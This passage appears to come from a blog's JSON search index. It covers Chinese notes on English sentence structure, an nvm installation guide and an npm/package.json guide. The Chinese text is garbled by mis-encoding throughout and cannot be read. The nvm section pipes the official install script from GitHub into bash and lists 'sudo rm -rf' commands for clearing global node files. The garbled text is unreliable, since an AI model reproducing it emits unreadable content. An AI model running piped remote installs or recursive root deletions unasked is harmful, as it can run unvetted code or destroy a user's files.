æ„Ÿå®˜åŠ¨è¯ (look,smell,taste,sound,feel)\n+ å˜åŒ– (become, get, turn, grow, fall)\n+ ä¿æŒ(keep, remain, stay, stand)\n\n### 2.4 ä¸»è°“å®¾å®¾\n\n+ I bought him a dog. æˆ‘ä¹°ä»–ä¸€ä¸ªç‹—\n\n+ ä¸¤ä¸ªå®¾è¯­æ²¡æœ‰å…³ç³», (ä»–æ˜¯ä¸€ä¸ªç‹—, è‚¯å®šä¸å¯¹)\n\n### 2.5 ä¸»è°“å®¾å®¾è¡¥\n\n+ We made him our monitor.  æˆ‘ä»¬è®©ä»–å½“ç­é•¿\n+ You should keep the room clean. ä½ åº”è¯¥è®©æˆ¿é—´å¹²å‡€\n\n### 2.6 æ€»ç»“:\n\n+ 2.4å’Œ2.5åŒºåˆ«, åœ¨å®¾è¯­åé¢(å‡å¦‚)åŠ ä¸ªæ˜¯,å¦‚æœæ˜¯å¯¹çš„,å°±æ˜¯2.5\n\n\n\n# 3. è°“è¯­\n\n### 3.1 è°“è¯­çš„æˆåˆ†\n\n+ æœ‰æ—¶æ€çš„å®ä¹‰åŠ¨è¯(æƒ…æ€åŠ¨è¯ä¸èƒ½åš)\n\n+ ç³»åŠ¨è¯\n\nhave limited.  æ•´ä¸ªæ˜¯è°“è¯­, have æ˜¯æ„æˆæ—¶æ€çš„.\n\n### 3.2 åŠ¨è¯èƒ½ä¸èƒ½å¤š?\n\n+ è°“è¯­åªèƒ½æ˜¯åŠ¨è¯?      å¯¹\n+ åŠ¨è¯åªèƒ½åšè°“è¯­?      å¯¹(éè°“è¯­åŠ¨è¯ä¸æ˜¯åŠ¨è¯)\n+ ç»å¯¹ä¸èƒ½å¤š, å…¶ä»–çš„åŠ¨è¯å˜æˆéè°“è¯­åŠ¨è¯\n+ åªæœ‰ä¸€ä¸ªåŠ¨è¯, è°çš„æ„ä¹‰æœ€é‡è¦, é€‰è°åšåŠ¨è¯\n  + æˆ‘çˆ±ä½ , ä½ çˆ±æˆ‘ (I loving you, you love me)\n\n### 3.3 åŠ¨è¯èƒ½ä¸èƒ½å°‘?\n\n+ ç»å¯¹ä¸èƒ½, å°‘çš„è¯åŠ  be åŠ¨è¯\n+ I against you.   (against æ˜¯ä»‹è¯)   --->  I am against you.\n+ å½“ä¸€å¥è¯éœ€è¦åŠ¨è¯åˆæ²¡æœ‰åŠ¨è¯çš„æ—¶å€™,éœ€è¦åŠ  be åŠ¨è¯, beåŠ¨è¯æ²¡æœ‰æ„æ€.\n\n### 3.4 åŠ¨è¯å˜é(è°“è¯­åŠ¨è¯)\n\n  + ing ä¸»åŠ¨\n  + ed   è¢«åŠ¨\n  + to do  ç›®çš„\n\n### 3.5 æ€»ç»“\n\n  + çœ‹å¥å­ç¬¬ä¸€æ­¥, æ‰¾åŠ¨è¯\n  + ä¸€å¥è¯å½“ä¸­,æœ‰ä¸”åªèƒ½æœ‰ä¸€ä¸ªæœ‰æ—¶æ€çš„å®æ„åŠ¨è¯æˆ–ç³»åŠ¨è¯çš„å­˜åœ¨,å¹¶ä¸”å……å½“è°“è¯­.\n\n### 3.6 å¤šä¸ªå¥å­å˜æˆä¸€å¥è¯(3ä¸ªæ–¹æ³•)\n\n+ ç‹¬ç«‹ä¸»æ ¼(ä¸€ä¸ªè°“è¯, å…¶ä»–éè°“è¯­åŠ¨è¯)\n  + ä¸¤ä¸ªä¸»è¯­è¦ä¸ä¸€æ ·\n  + å¦‚æœä¸€æ ·çš„è¯, è¦çœç•¥æ‰éè°“è¯­åŠ¨è¯çš„ä¸»è¯­(ä¸æ˜¯ç‹¬ç«‹ä¸»æ ¼, å«åˆ†è¯åšçŠ¶è¯­)\n  + Being a teacher, I like singing songs. æˆ‘æ˜¯ä¸€ä¸ªè€å¸ˆ,æˆ‘å–œæ¬¢å”±æ­Œ.\n+ åŠ è¿æ¥è¯(and...)ç»„æˆå¹¶åˆ—å¥\n+ ä¸»å¥+ä»å¥ç»„æˆå¤åˆå¥\n\n\n\n# 4. ä¸»è¯­\n\n### 4.1 ä¸»è¯­çš„æˆåˆ†\n\n+ åè¯\n\n+ ä»£è¯\n\n+ éè°“è¯­åŠ¨è¯\n\n+ å¥å­ä¸èƒ½,ä»å¥å¯ä»¥(å¼•å¯¼è¯+å¥å­)\n\n  \n\nHandsome and strong are his nature. (é”™è¯¯,å½¢å®¹è¯ä¸å¯ä»¥å½“ä¸»è¯­)\n\næ”¹æˆ\n\nBeing handsome and strong is his nature. (éè°“è¯­åŠ¨è¯åšä¸»è¯­)\n\n### 4.2 ä¸»å¥èƒ½ä¸èƒ½å°‘\n\n+ ç»å¯¹ä¸èƒ½\n+ ç¥ˆä½¿å¥æœ‰ä¸»è¯­,åªæ˜¯çœç•¥äº†\n\næ²¡æœ‰ä¸»è¯­æ€ä¹ˆåŠ?\n\n+ åŠ  it ä½œä¸ºä¸»è¯­,  å¿…é¡»ä¸å¤©æ°”, æ¸©åº¦,æ—¶é—´æœ‰å…³ç³».\n\n  + It feels exceedingly hot in the cabin.(æœºèˆ±é‡Œå¾ˆçƒ­)\n\n+ there be å¥å‹, å¬åˆ° \"æœ‰\" çš„æ—¶å€™ä½¿ç”¨.\n\n  + There exist a host of undergraduates being fascinated with me.(ä¸€äº›å¤§å­¦ç”Ÿå–œæ¬¢æˆ‘)\n\n+ è¢«åŠ¨: å¦‚æœä¸€å¥è¯æ²¡æœ‰ä¸»è¯­, æ‰€æœ‰ç”¨äººç§°ä»£è¯åšä¸»è¯­çš„å¥å­,éƒ½å¯ä»¥è€ƒè™‘å†™æˆè¢«åŠ¨.\n\n  + Persistence must be pointed out outstandingly.(å¿…é¡»æŒ‡å‡ºåšæŒå¾ˆé‡è¦.)\n\n  + ä¸‰ç§æƒ…å†µæ— è¢«åŠ¨.   \n\n    + åŠ¨è¯åé¢æœ‰ä»‹è¯æ—¶, æ— è¢«åŠ¨\n\n    + ç³»åŠ¨è¯æ²¡æœ‰è¢«åŠ¨\n    + have è¡¨è¾¾ \"æœ‰\" çš„æ„æ€æ—¶, æ— è¢«åŠ¨\n\n+ äººç§°ä»£è¯åšä¸»è¯­.  (I you we)\n  + ä¸åˆ°ä¸‡ä¸å¾—å·²,ä¸è¦ä½¿ç”¨\n\n\n\n# 5. å®¾è¯­\n\n### 5.1 å®¾è¯­çš„æˆåˆ†\n\n+ åè¯(ä»£è¯)\n+ éè°“è¯­åŠ¨è¯\n+ ä»å¥\n\nå’Œä¸»è¯­æˆåˆ†ä¸€æ ·, å› ä¸ºå¯ä»¥å’Œä¸»è¯­æ¢ä¸»åŠ¨è¢«åŠ¨.\n\n# 6. è¡¨è¯­\n\n### 6.1 è¡¨è¯­çš„æˆåˆ†\n\n+ åè¯(ä»£è¯)\n+ éè°“è¯­åŠ¨è¯\n+ ä»å¥\n+ (ç‰¹æœ‰)å½¢å®¹è¯\n+ (ç‰¹æœ‰)ä»‹è¯çŸ­è¯­\n\n\n\n# 7. ç»ƒä¹ \n\n+ æˆ‘å–œæ¬¢åœ¨é‡åº†,  I like being in Beijing.  (ä»‹è¯çŸ­è¯­ä¸èƒ½åšå®¾è¯­,æ¢æˆéè°“è¯­åŠ¨è¯)\n+ I smile on the stage. (ä¸»è°“ç»“æ„, ä»‹è¯ä¸èƒ½åšå®¾è¯­,ä¸æ˜¯ä¸»è°“å®¾, smileå®ä¹‰åŠ¨è¯,ä¸æ˜¯ä¸»ç³»è¡¨)\n\n+ I exchange with my watch.(å†™é”™äº†çš„å¥å­, exchangeåŠç‰©åŠ¨è¯åé¢å¿…é¡»è·Ÿå®¾è¯­,å°‘äº†æˆåˆ†)\n\n\n\n# 8. ç®€å•å¥è€ƒç‚¹åˆ†æ\n\n### 8.1 å†™ä½œ\n\n+ å…ˆå†™æˆç®€å•å¥,ä¿è¯è¯­æ³•æ­£ç¡®\n+ å•è¯ä¸ä¼šå†™, æ¢æˆè‡ªå·±ä¼šçš„å•è¯,è€å¸ˆä¹Ÿä¸çŸ¥é“æˆ‘è¡¨è¾¾çš„æ„æ€\n\n### 8.2 é•¿çŸ­å¥åˆ†æ\n\n+ ç¬¬ä¸€æ­¥, æ‰¾åŠ¨è¯(è°“è¯­), ä»è€Œæ‰¾åˆ°ä¸€å¥è¯çš„ä¸»è°“å®¾\n+ å¦‚æœæœ‰å¤šä¸ªåŠ¨è¯, å¯èƒ½æ˜¯å¹¶åˆ—å¥æˆ–è€…å¤åˆå¥ä»å¥, åªèƒ½1ä¸ªæ˜¯ä¸»è¯­çš„åŠ¨è¯\n+ ä¸»è¯­çš„è°“è¯­åŠ¨è¯å‰é¢æ²¡æœ‰å¼•å¯¼è¯\n\n### 8.3 ä¹ é¢˜\n\n+ å…¨çƒåœ¨å˜æš–\n\n  It is becoming warm throughout the world.\n\n+ å¦’å¿Œæœ¬èº«å°±æ˜¯ä¸€ç§ä»°æœ›.\n\n  Being jealous is a kind of worship.\n\n+ æœ‰æ„ä¹‰å°±æ˜¯å¥½å¥½æ´»\n\n  Being meaningful proves to live well.\n\n+ å¥½å¥½æ´»å°±æ˜¯åšæœ‰æ„ä¹‰çš„äº‹æƒ…\n\n  living well seems to do meaningful things.","tags":["enlish"],"categories":["è‹±è¯­"]},{"title":"nodeç‰ˆæœ¬ç®¡ç†nvmçš„å®‰è£…å’Œä½¿ç”¨","url":"%2Fp%2Fdf22a20c.html","content":"\n\n\næˆ‘ä»¬å¯èƒ½åŒæ—¶åœ¨è¿›è¡Œ2ä¸ªé¡¹ç›®ï¼Œè€Œ2ä¸ªä¸åŒçš„é¡¹ç›®æ‰€ä½¿ç”¨çš„nodeç‰ˆæœ¬åˆæ˜¯ä¸ä¸€æ ·çš„ï¼Œæˆ–è€…æ˜¯è¦ç”¨æ›´æ–°çš„nodeç‰ˆæœ¬è¿›è¡Œè¯•éªŒå’Œå­¦ä¹ ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œå¯¹äºç»´æŠ¤å¤šä¸ªç‰ˆæœ¬çš„nodeå°†ä¼šæ˜¯ä¸€ä»¶éå¸¸éº»çƒ¦çš„äº‹æƒ…ï¼Œè€Œnvmå°±æ˜¯ä¸ºè§£å†³è¿™ä¸ªé—®é¢˜è€Œäº§ç”Ÿçš„ï¼Œä»–å¯ä»¥æ–¹ä¾¿çš„åœ¨åŒä¸€å°è®¾å¤‡ä¸Šè¿›è¡Œå¤šä¸ªnodeç‰ˆæœ¬ä¹‹é—´åˆ‡æ¢ï¼Œè€Œè¿™ä¸ªæ­£æ˜¯nvmçš„ä»·å€¼æ‰€åœ¨ã€‚\n\n\n\n### 1. nodejsï¼Œnpmï¼Œnvmä¹‹é—´çš„åŒºåˆ«\n\n+ nodejsï¼šåœ¨é¡¹ç›®å¼€å‘æ—¶çš„æ‰€éœ€è¦çš„ä»£ç åº“\n\n+ npmï¼šnodejs åŒ…ç®¡ç†å·¥å…·ã€‚åœ¨å®‰è£…çš„ nodejs çš„æ—¶å€™ï¼Œnpm ä¹Ÿä¼šè·Ÿç€ä¸€èµ·å®‰è£…ï¼Œå®ƒæ˜¯åŒ…ç®¡ç†å·¥å…·ã€‚npm ç®¡ç† nodejs ä¸­çš„ç¬¬ä¸‰æ–¹æ’ä»¶\n\n+ nvmï¼šnodejs ç‰ˆæœ¬ç®¡ç†å·¥å…·ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼šä¸€ä¸ª nvm å¯ä»¥ç®¡ç†å¾ˆå¤š node ç‰ˆæœ¬å’Œ npm ç‰ˆæœ¬ã€‚\n\n\n\n<!-- more -->\n\n### 2. nvmçš„å®‰è£…:\n\nå¦‚æœåœ¨å®‰è£…nvmä¹‹å‰å°±å®‰è£…äº†node, é‚£ä¹ˆæœ€å¥½åœ¨å®‰è£…ä¹‹å‰æ¸…ç†ä¸‹å…¨å±€çš„nodeç¯å¢ƒ.\n\n```shell\nnpm ls -g --depth=0 # æŸ¥çœ‹å·²ç»å®‰è£…åœ¨å…¨å±€çš„æ¨¡å—ï¼Œä»¥ä¾¿åˆ é™¤è¿™äº›å…¨å±€æ¨¡å—åå†æŒ‰ç…§ä¸åŒçš„ node ç‰ˆæœ¬é‡æ–°è¿›è¡Œå…¨å±€å®‰è£…\n\nsudo rm -rf /usr/local/lib/node_modules # åˆ é™¤å…¨å±€ node_modules ç›®å½•\n\nsudo rm -rf ~/.npm/ # åˆ é™¤æ¨¡å—ç¼“å­˜ç›®å½•\n\nsudo rm /usr/local/bin/node # åˆ é™¤ node\n\ncd  /usr/local/bin && ls -l | grep \"../lib/node_modules/\" | awk '{print $9}'| xargs rm # åˆ é™¤å…¨å±€ node æ¨¡å—æ³¨å†Œçš„è½¯é“¾\n```\n\n\n\nå®‰è£…: https://github.com/nvm-sh/nvm\n\n```shell\ncurl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.34.0/install.sh | bash\n```\n\né‡æ–°æ‰“å¼€ä¸€ä¸ªç»ˆç«¯è¾“å…¥ `nvm`å³å¯\n\n\n\n### 3. nvmå¸¸ç”¨æŒ‡ä»¤\n\n```shell\nnvm version #æŸ¥çœ‹å½“å‰çš„ç‰ˆæœ¬\n\nnvm ls-remote #åˆ—å‡ºæ‰€æœ‰å¯å®‰è£…çš„ç‰ˆæœ¬\n\nnvm install <version> #å®‰è£…æŒ‡å®šçš„ç‰ˆæœ¬ï¼Œå¦‚nvm install v8.14.0\n\nnvm uninstall <version> #å¸è½½æŒ‡å®šçš„ç‰ˆæœ¬\n\nnvm ls #åˆ—å‡ºæ‰€æœ‰å·²ç»å®‰è£…çš„ç‰ˆæœ¬\n\nnvm use <version> #åˆ‡æ¢ä½¿ç”¨æŒ‡å®šçš„ç‰ˆæœ¬\n\nnvm current #æ˜¾ç¤ºå½“å‰ä½¿ç”¨çš„ç‰ˆæœ¬\n\nnvm alias default <version> #è®¾ç½®é»˜è®¤nodeç‰ˆæœ¬\n\n```\n\n\n\n#### 3.1 å®‰è£…æœ€æ–°ç¨³å®šç‰ˆ node\n\n```shell\nnvm install stable  \n```\n\n\n\n#### 3.2 nodeè¢«å®‰è£…åœ¨å“ªé‡Œäº†å‘¢?\n\nåœ¨ç»ˆç«¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨which nodeæ¥æŸ¥çœ‹æˆ‘ä»¬çš„nodeè¢«å®‰è£…åˆ°äº†å“ªé‡Œï¼Œè¿™é‡Œç»ˆç«¯æ‰“å°å‡ºæ¥çš„åœ°å€å…¶å®æ˜¯ä½ å½“å‰ä½¿ç”¨çš„nodeç‰ˆæœ¬å¿«æ·æ–¹å¼çš„åœ°å€ã€‚\n\n```\n$ which node\n/Users/liuwei/.nvm/versions/node/v12.2.0/bin/node\n\n\n$ which npm\n/Users/liuwei/.nvm/versions/node/v12.2.0/bin/npm\n```\n\n\n\n### 4. nvm å’Œ n  çš„åŒºåˆ«\n\nåœ¨ node çš„ç‰ˆæœ¬ç®¡ç†å·¥å…·ä¸­ï¼Œnvm è‡ªç„¶å£°åè¿œæ‰¬ï¼Œç„¶è€Œæˆ‘ä»¬ä¹Ÿä¸èƒ½å¿˜äº†æ¥è‡ª TJ çš„ nã€‚è¿™ä¸¤ç§ï¼Œæ˜¯ç›®å‰æœ€ä¸»æµçš„æ–¹æ¡ˆã€‚\n\nå…³äºè¿™ä¸¤ä¸ªå·¥å…·å¦‚ä½•å®‰è£…å’Œä½¿ç”¨ï¼Œè¿™é‡Œä¸å†èµ˜è¨€ï¼Œè¯·è§å®ƒä»¬å„è‡ªçš„ä¸»é¡µï¼š\n\n- [creationix/nvm](https://github.com/creationix/nvm)\n- [tj/n](https://github.com/tj/n)\n\næ¥ä¸‹æ¥æˆ‘ä»¬ç€é‡å…³æ³¨ä¸€ä¸‹ nvm å’Œ n çš„è¿ä½œæœºåˆ¶å’Œç‰¹æ€§ã€‚\n\n#### 4.1 n\n\nn æ˜¯ä¸€ä¸ªéœ€è¦å…¨å±€å®‰è£…çš„ npm packageã€‚\n\n```shell\nnpm install -g n\n```\n\n\nè¿™æ„å‘³ç€ï¼Œæˆ‘ä»¬åœ¨ä½¿ç”¨ n ç®¡ç† node ç‰ˆæœ¬å‰ï¼Œé¦–å…ˆéœ€è¦ä¸€ä¸ª node ç¯å¢ƒã€‚æˆ‘ä»¬æˆ–è€…ç”¨ Homebrew æ¥å®‰è£…ä¸€ä¸ª nodeï¼Œæˆ–è€…ä»å®˜ç½‘ä¸‹è½½ pkg æ¥å®‰è£…ï¼Œæ€»ä¹‹æˆ‘ä»¬å¾—å…ˆè‡ªå·±è£…ä¸€ä¸ª node â€”â€” n æœ¬èº«æ˜¯æ²¡æ³•ç»™ä½ è£…çš„ã€‚\n\nç„¶åæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ n æ¥å®‰è£…ä¸åŒç‰ˆæœ¬çš„ nodeã€‚\n\nåœ¨å®‰è£…çš„æ—¶å€™ï¼Œn ä¼šå…ˆå°†æŒ‡å®šç‰ˆæœ¬çš„ node å­˜å‚¨ä¸‹æ¥ï¼Œç„¶åå°†å…¶å¤åˆ¶åˆ°æˆ‘ä»¬ç†ŸçŸ¥çš„è·¯å¾„/usr/local/binï¼Œéå¸¸ç®€å•æ˜äº†ã€‚å½“ç„¶ç”±äº n ä¼šæ“ä½œåˆ°éç”¨æˆ·ç›®å½•ï¼Œæ‰€ä»¥éœ€è¦åŠ  sudo æ¥æ‰§è¡Œå‘½ä»¤ã€‚\n\næ‰€ä»¥è¿™æ ·çœ‹æ¥ï¼Œn åœ¨å…¶å®ç°ä¸Šæ˜¯ä¸€ä¸ªéå¸¸æ˜“ç†è§£çš„æ–¹æ¡ˆã€‚\n\n\n\n#### 4.2 nvm\n\næˆ‘ä»¬å†æ¥çœ‹ nvmã€‚ä¸åŒäº nï¼Œnvm ä¸æ˜¯ä¸€ä¸ª npm packageï¼Œè€Œæ˜¯ä¸€ä¸ªç‹¬ç«‹è½¯ä»¶åŒ…ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬éœ€è¦å•ç‹¬ä½¿ç”¨å®ƒçš„å®‰è£…é€»è¾‘ï¼š\n\n```shell\ncurl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.34.0/install.sh | bash(zsh)# æ³¨æ„åé¢çš„bashç¯å¢ƒ\n```\n\n\n\nç„¶åæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ nvm æ¥å®‰è£…ä¸åŒç‰ˆæœ¬çš„ nodeã€‚\n\nåœ¨å®‰è£…çš„æ—¶å€™ï¼Œnvm å°†ä¸åŒçš„ node ç‰ˆæœ¬å­˜å‚¨åˆ° ~/.nvm/<version>/ ä¸‹ï¼Œç„¶åä¿®æ”¹$PATHï¼Œå°†æŒ‡å®šç‰ˆæœ¬çš„ node è·¯å¾„åŠ å…¥ï¼Œè¿™æ ·æˆ‘ä»¬è°ƒç”¨çš„ node å‘½ä»¤å³æ˜¯ä½¿ç”¨æŒ‡å®šç‰ˆæœ¬çš„ nodeã€‚\n\nnvm æ˜¾ç„¶æ¯” n è¦å¤æ‚ä¸€äº›ï¼Œä½†æ˜¯å¦ä¸€æ–¹é¢ï¼Œç”±äºå®ƒæ˜¯ä¸€ä¸ªç‹¬ç«‹è½¯ä»¶åŒ…ï¼Œå› æ­¤å®ƒå’Œ node ä¹‹é—´çš„å…³ç³»çœ‹ä¸Šå»æ›´åˆä¹é€»è¾‘ï¼šnvm ä¸ä¾èµ– node ç¯å¢ƒï¼Œæ˜¯ node ä¾èµ– nvmï¼›è€Œä¸åƒ n é‚£æ ·äº§ç”Ÿç±»ä¼¼å¾ªç¯ä¾èµ–çš„é—®é¢˜ã€‚\n\n","tags":["nodejs"],"categories":["nodejs"]},{"title":"nodejsçš„æ¨¡å—å®‰è£…å’Œpackage.json","url":"%2Fp%2Fd100a0c2.html","content":"\n\n\n### 1. npm ä»‹ç»\n\n[npm](https://www.npmjs.com/package/npm) æ˜¯ Node çš„æ¨¡å—ç®¡ç†å™¨ï¼ŒåŠŸèƒ½æå…¶å¼ºå¤§ã€‚å®ƒæ˜¯ Node è·å¾—æˆåŠŸçš„é‡è¦åŸå› ä¹‹ä¸€ã€‚\n\nnpmä¸éœ€è¦å•ç‹¬å®‰è£…ã€‚åœ¨å®‰è£…Nodeçš„æ—¶å€™ï¼Œä¼šè¿å¸¦ä¸€èµ·å®‰è£…npmã€‚ä½†æ˜¯ï¼ŒNodeé™„å¸¦çš„npmå¯èƒ½ä¸æ˜¯æœ€æ–°ç‰ˆæœ¬ï¼Œæœ€å¥½ç”¨ä¸‹é¢çš„å‘½ä»¤ï¼Œæ›´æ–°åˆ°æœ€æ–°ç‰ˆæœ¬ã€‚\n\n```shell\nnpm install npm@latest -g \n```\n\nä¸Šé¢çš„å‘½ä»¤ä¸­ï¼Œ@latestè¡¨ç¤ºæœ€æ–°ç‰ˆæœ¬ï¼Œ-gè¡¨ç¤ºå…¨å±€å®‰è£…ã€‚æ‰€ä»¥ï¼Œå‘½ä»¤çš„ä¸»å¹²æ˜¯npm install npmï¼Œä¹Ÿå°±æ˜¯ä½¿ç”¨npmå®‰è£…è‡ªå·±ã€‚ä¹‹æ‰€ä»¥å¯ä»¥è¿™æ ·ï¼Œæ˜¯å› ä¸ºnpmæœ¬èº«ä¸Nodeçš„å…¶ä»–æ¨¡å—æ²¡æœ‰åŒºåˆ«ã€‚\n\n<!-- more -->\n\n\n\n### 2. npm å®‰è£…\n\n#### 2.1 npm install \n\n[npm install](https://docs.npmjs.com/cli/install) å‘½ä»¤ç”¨æ¥å®‰è£…æ¨¡å—åˆ°node_modulesç›®å½•ã€‚\n\n```shell\n $ npm install <packageName> \n```\n\n\n\nå®‰è£…ä¹‹å‰ï¼Œnpm installä¼šå…ˆæ£€æŸ¥ï¼Œnode_modulesç›®å½•ä¹‹ä¸­æ˜¯å¦å·²ç»å­˜åœ¨æŒ‡å®šæ¨¡å—ã€‚å¦‚æœå­˜åœ¨ï¼Œå°±ä¸å†é‡æ–°å®‰è£…äº†ï¼Œå³ä½¿è¿œç¨‹ä»“åº“å·²ç»æœ‰äº†ä¸€ä¸ªæ–°ç‰ˆæœ¬ï¼Œä¹Ÿæ˜¯å¦‚æ­¤ã€‚\n\nå¦‚æœä½ å¸Œæœ›ï¼Œä¸€ä¸ªæ¨¡å—ä¸ç®¡æ˜¯å¦å®‰è£…è¿‡ï¼Œnpm éƒ½è¦å¼ºåˆ¶é‡æ–°å®‰è£…ï¼Œå¯ä»¥ä½¿ç”¨-fæˆ–--forceå‚æ•°ã€‚\n\n```shell\n $ npm install <packageName> --force\n```\n\n\n\n#### 2.2 npm update\n\nå¦‚æœæƒ³æ›´æ–°å·²å®‰è£…æ¨¡å—ï¼Œå°±è¦ç”¨åˆ°[npm update](https://docs.npmjs.com/cli/update)å‘½ä»¤ã€‚\n\n```shell\n $ npm update <packageName> \n```\n\nå®ƒä¼šå…ˆåˆ°è¿œç¨‹ä»“åº“æŸ¥è¯¢æœ€æ–°ç‰ˆæœ¬ï¼Œç„¶åæŸ¥è¯¢æœ¬åœ°ç‰ˆæœ¬ã€‚å¦‚æœæœ¬åœ°ç‰ˆæœ¬ä¸å­˜åœ¨ï¼Œæˆ–è€…è¿œç¨‹ç‰ˆæœ¬è¾ƒæ–°ï¼Œå°±ä¼šå®‰è£…ã€‚\n\n\n\n#### 2.3 registry\n\nnpm updateå‘½ä»¤æ€ä¹ˆçŸ¥é“æ¯ä¸ªæ¨¡å—çš„æœ€æ–°ç‰ˆæœ¬å‘¢ï¼Ÿ\n\nç­”æ¡ˆæ˜¯ npm æ¨¡å—ä»“åº“æä¾›äº†ä¸€ä¸ªæŸ¥è¯¢æœåŠ¡ï¼Œå«åš registry ã€‚ä»¥ npmjs.org ä¸ºä¾‹ï¼Œå®ƒçš„æŸ¥è¯¢æœåŠ¡ç½‘å€æ˜¯ https://registry.npmjs.org/ ã€‚\n\nè¿™ä¸ªç½‘å€åé¢è·Ÿä¸Šæ¨¡å—åï¼Œå°±ä¼šå¾—åˆ°ä¸€ä¸ª JSON å¯¹è±¡ï¼Œé‡Œé¢æ˜¯è¯¥æ¨¡å—æ‰€æœ‰ç‰ˆæœ¬çš„ä¿¡æ¯ã€‚æ¯”å¦‚ï¼Œè®¿é—® <https://registry.npmjs.org/react>ï¼Œå°±ä¼šçœ‹åˆ° react æ¨¡å—æ‰€æœ‰ç‰ˆæœ¬çš„ä¿¡æ¯ã€‚\n\nå®ƒè·Ÿä¸‹é¢å‘½ä»¤çš„æ•ˆæœæ˜¯ä¸€æ ·çš„ã€‚\n\n```shell\n $ npm view react  \n```\n\n\n\nregistry ç½‘å€çš„æ¨¡å—ååé¢ï¼Œè¿˜å¯ä»¥è·Ÿä¸Šç‰ˆæœ¬å·æˆ–è€…æ ‡ç­¾ï¼Œç”¨æ¥æŸ¥è¯¢æŸä¸ªå…·ä½“ç‰ˆæœ¬çš„ä¿¡æ¯ã€‚æ¯”å¦‚ï¼Œ è®¿é—® https://registry.npmjs.org/react/v0.14.6 ï¼Œå°±å¯ä»¥çœ‹åˆ° React çš„ 0.14.6 ç‰ˆã€‚\n\nè¿”å›çš„ JSON å¯¹è±¡é‡Œé¢ï¼Œæœ‰ä¸€ä¸ªdist.tarballå±æ€§ï¼Œæ˜¯è¯¥ç‰ˆæœ¬å‹ç¼©åŒ…çš„ç½‘å€ã€‚\n\n```json\ndist: {   \n\tshasum: '2a57c2cf8747b483759ad8de0fa47fb0c5cf5c6a',   \n\ttarball: 'http://registry.npmjs.org/react/-/react-0.14.6.tgz'  \n},\n```\n\n\n\nåˆ°è¿™ä¸ªç½‘å€ä¸‹è½½å‹ç¼©åŒ…ï¼Œåœ¨æœ¬åœ°è§£å‹ï¼Œå°±å¾—åˆ°äº†æ¨¡å—çš„æºç ã€‚`npm install`å’Œ`npm update`å‘½ä»¤ï¼Œéƒ½æ˜¯é€šè¿‡è¿™ç§æ–¹å¼å®‰è£…æ¨¡å—çš„ã€‚\n\n\n\n#### 2.4 ç¼“å­˜ç›®å½•\n\nnpm installæˆ–npm updateå‘½ä»¤ï¼Œä» registry ä¸‹è½½å‹ç¼©åŒ…ä¹‹åï¼Œéƒ½å­˜æ”¾åœ¨æœ¬åœ°çš„ç¼“å­˜ç›®å½•ã€‚\n\nè¿™ä¸ªç¼“å­˜ç›®å½•ï¼Œåœ¨ Linux æˆ– Mac é»˜è®¤æ˜¯ç”¨æˆ·ä¸»ç›®å½•ä¸‹çš„.npmç›®å½•ï¼Œåœ¨ Windows é»˜è®¤æ˜¯%AppData%/npm-cacheã€‚é€šè¿‡é…ç½®å‘½ä»¤ï¼Œå¯ä»¥æŸ¥çœ‹è¿™ä¸ªç›®å½•çš„å…·ä½“ä½ç½®ã€‚\n\n```shell\n $ npm config get cache \n /Users/liuwei/.npm\n```\n\n \n\n.npmç›®å½•ä¿å­˜ç€å¤§é‡æ–‡ä»¶ï¼Œæ¸…ç©ºå®ƒçš„å‘½ä»¤å¦‚ä¸‹ã€‚ \n\n```shell\n$ rm -rf ~/.npm/ \næˆ–\n$ npm cache clean \n```\n\n\n\n#### 2.5 æ¨¡å—çš„å®‰è£…è¿‡ç¨‹\n\næ€»ç»“ä¸€ä¸‹ï¼ŒNodeæ¨¡å—çš„å®‰è£…è¿‡ç¨‹æ˜¯è¿™æ ·çš„ã€‚\n\n1. å‘å‡ºnpm installå‘½ä»¤\n2. npm å‘ registry æŸ¥è¯¢æ¨¡å—å‹ç¼©åŒ…çš„ç½‘å€\n3. ä¸‹è½½å‹ç¼©åŒ…ï¼Œå­˜æ”¾åœ¨~/.npmç›®å½•\n4. è§£å‹å‹ç¼©åŒ…åˆ°å½“å‰é¡¹ç›®çš„node_modulesç›®å½•\n\n\n\næ³¨æ„ï¼Œä¸€ä¸ªæ¨¡å—å®‰è£…ä»¥åï¼Œæœ¬åœ°å…¶å®ä¿å­˜äº†ä¸¤ä»½ã€‚ä¸€ä»½æ˜¯~/.npmç›®å½•ä¸‹çš„å‹ç¼©åŒ…ï¼Œå¦ä¸€ä»½æ˜¯node_modulesç›®å½•ä¸‹è§£å‹åçš„ä»£ç ã€‚\n\nä½†æ˜¯ï¼Œè¿è¡Œnpm installçš„æ—¶å€™ï¼Œåªä¼šæ£€æŸ¥node_modulesç›®å½•ï¼Œè€Œä¸ä¼šæ£€æŸ¥~/.npmç›®å½•ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœä¸€ä¸ªæ¨¡å—åœ¨ï½/.npmä¸‹æœ‰å‹ç¼©åŒ…ï¼Œä½†æ˜¯æ²¡æœ‰å®‰è£…åœ¨node_modulesç›®å½•ä¸­ï¼Œnpm ä¾ç„¶ä¼šä»è¿œç¨‹ä»“åº“ä¸‹è½½ä¸€æ¬¡æ–°çš„å‹ç¼©åŒ…ã€‚\n\n\n\n### 3. package.json\n\nç®¡ç†æœ¬åœ°å®‰è£… npm åŒ…çš„æœ€å¥½æ–¹å¼å°±æ˜¯åˆ›å»º package.json æ–‡ä»¶ã€‚ä¸€ä¸ª package.json æ–‡ä»¶å¯ä»¥æœ‰ä»¥ä¸‹å‡ ç‚¹ä½œç”¨ï¼š\n\n+ ä½œä¸ºä¸€ä¸ªæè¿°æ–‡ä»¶ï¼Œæè¿°äº†ä½ çš„é¡¹ç›®ä¾èµ–å“ªäº›åŒ…\n\n+ å…è®¸æˆ‘ä»¬ä½¿ç”¨ â€œè¯­ä¹‰åŒ–ç‰ˆæœ¬è§„åˆ™â€ï¼ˆåé¢ä»‹ç»ï¼‰æŒ‡æ˜ä½ é¡¹ç›®ä¾èµ–åŒ…çš„ç‰ˆæœ¬\n\n+ è®©ä½ 